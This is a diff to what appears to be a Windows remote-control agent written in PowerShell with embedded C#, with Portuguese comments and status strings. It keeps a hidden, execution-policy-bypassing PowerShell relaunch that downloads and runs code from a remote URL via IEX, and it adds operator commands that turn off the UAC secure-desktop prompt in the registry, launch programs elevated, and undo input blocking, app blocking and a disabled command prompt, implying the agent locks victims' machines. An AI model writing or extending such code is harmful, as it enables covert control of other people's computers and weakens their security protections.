@@ -146,8 +146,6 @@ if ($args -contains '-repair') { Repair-Installation -Trigger:($args -contains '
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    # AQUI: Removido o -NoExit e adicionado -WindowStyle Hidden. 
-    # A janela do UAC vai aparecer (obrigatório do Windows), mas a tela preta não abrirá.
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
@@ -688,6 +686,29 @@ if (-not ("R9KAgent" -as [type])) {
                     int n = Screen.AllScreens.Length;
                     if (n > 1) { currentScreen = (currentScreen + 1) % n; lock (writeLock) { myWriter.WriteLine("MONITOR:" + currentScreen + "/" + n); } }
                     else { lock (writeLock) { myWriter.WriteLine("MONITOR:1/1"); } }
+                    return;
+                }
+                if (cmd.StartsWith("open_uac ")) {
+                    string app = cmd.Substring(9).Trim();
+                    try {
+                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
+                            if (key != null) key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
+                        }
+                        ProcessStartInfo psi = new ProcessStartInfo(app);
+                        psi.UseShellExecute = true;
+                        psi.Verb = "runas";
+                        Process.Start(psi);
+                        lock (writeLock) { myWriter.WriteLine("UAC_EXIBIDO_NA_TELA"); }
+                    } catch {}
+                    return;
+                }
+                if (cmd == "unblock_all") {
+                    BlockInput(false);
+                    UnblockAllApps();
+                    try { using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) { if (key != null) key.DeleteValue("DisableCMD", false); } } catch {}
+                    try { using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) { if (key != null) key.SetValue("EnableLUA", 1, RegistryValueKind.DWord); } } catch {}
+                    try { Form f = bannerForm; if (f != null) { f.BeginInvoke(new Action(() => f.Close())); } } catch {}
+                    lock (writeLock) { myWriter.WriteLine("SISTEMA_DESBLOQUEADO"); }
                     return;
                 }
                 if (cmd.StartsWith("clip_sync ")) {
